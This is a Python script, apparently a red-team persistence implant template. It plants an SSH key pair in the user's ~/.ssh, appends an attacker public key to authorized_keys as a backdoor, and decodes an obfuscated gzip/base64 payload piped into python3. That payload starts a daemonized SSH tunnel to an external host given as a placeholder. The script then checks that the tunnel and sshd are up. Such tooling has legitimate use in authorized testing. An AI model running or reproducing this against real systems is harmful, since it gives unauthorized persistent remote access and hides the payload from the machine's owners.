#!/usr/bin/env python3
# Copyright (c) 2023, Oracle and/or its affiliates.

import os
import sys
import stat
import base64
import subprocess
import time
import io  # replace StringIO
import gzip
from string import ascii_lowercase
import socket

PRIVKEY = "PRIVATE_KEY_PLACEHOLDER"
PUBKEY = "PUBLIC_KEY_PLACEHOLDER"
PORT = "PORT_PLACEHOLDER"
FQDN = "FQDN_PLACEHOLDER"

RW = stat.S_IRUSR | stat.S_IWUSR


def w(p, b):
    with open(p, "wb") as f:  # "wb" since the result of b64decode is bytes
        f.write(base64.b64decode(b.encode()))  # encode the string to bytes before decoding
    os.chmod(p, RW)


def templify(template, replacements):
    out = template
    for k, v in replacements.items():
        out = out.replace(k, v)
    return out


def gzbase(stuff):
    out = io.BytesIO()  # replace StringIO.StringIO
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
        f.write(stuff.encode())
    return base64.b64encode(out.getvalue()).decode()  # return as string


def ungzbase(unbased):
    gzipped = io.BytesIO()  # replace StringIO.StringIO
    gzipped.write(base64.b64decode(unbased.encode()))  # encode the string to bytes before decoding
    gzipped.seek(0)
    with gzip.GzipFile(fileobj=gzipped) as f:
        return f.read().decode()  # return as string


DOTSSH = os.path.expanduser("~/.ssh")
if not os.path.exists(DOTSSH):
    os.mkdir(DOTSSH)
    os.chmod(DOTSSH, stat.S_IRWXU)

KEYPATH_TEMPLATE = os.path.expanduser("~/.ssh/id_rsa")
keypath = None
pubkeypath = None
for c in ascii_lowercase[1:]:
    keypath = KEYPATH_TEMPLATE + c
    pubkeypath = keypath + ".pub"
    if not os.path.exists(keypath):
        break
print("[+] keypath:", keypath)

w(keypath, PRIVKEY)
print("[+] wrote private key:", keypath)
w(pubkeypath, PUBKEY)
print("[+] wrote public key:", pubkeypath)

with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:
    f.write(base64.b64decode(PUBKEY.encode()).decode())  # decode bytes to string
    print("[+] wrote to ~/.ssh/authorized_keys")

payload = ungzbase('IMPLANT_PLACEHOLDER')
encoded = gzbase(templify(payload, {'KEYFILE_PLACEHOLDER': keypath}))

os.system("echo %s | base64 -d | gzip -d | python3 " % encoded)

print("[+] started daemonized tunnel")
print("[*] waiting one minute for tunnel to come up...")
time.sleep(5)

psx = "ps x | grep ssh | grep '%s' | grep -v grep | wc -l" % FQDN
proc = subprocess.Popen(psx, shell=True, stdout=subprocess.PIPE, text=True)  # use text=True
(out, err) = proc.communicate()
num = int(out.strip())
if num == 2:
    print("[+] tunnel running")
else:
    print(f"[-] seems like {num} copies running")
    print("[-] Something is wrong.  You should investigate/clean-up")
    sys.exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex(('127.0.0.1', 22))
if result != 0:
    print("[-] sshd needs to be enabled on this system")
sock.close()
